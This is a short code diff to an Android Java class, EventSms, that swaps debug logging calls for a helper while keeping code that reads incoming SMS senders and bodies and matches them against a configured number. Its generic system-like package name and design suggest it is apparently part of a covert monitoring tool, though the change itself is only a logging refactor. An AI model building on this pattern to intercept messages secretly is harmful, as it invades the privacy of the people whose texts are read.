@@ -11,12 +11,11 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import android.util.Log;
-
 import com.android.service.Sms;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerSms;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
@@ -62,7 +61,7 @@ public class EventSms extends EventBase implements Observer<Sms> {
 			
 			num = text = null;
 		} catch (final IOException e) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
 			return false;
 		}
 		
@@ -76,7 +75,7 @@ public class EventSms extends EventBase implements Observer<Sms> {
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Sms s) {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
+		if(Cfg.DEBUG) Check.log( TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
 		
 		if (s.getAddress().equalsIgnoreCase(this.number) == false) {
 			return 0;
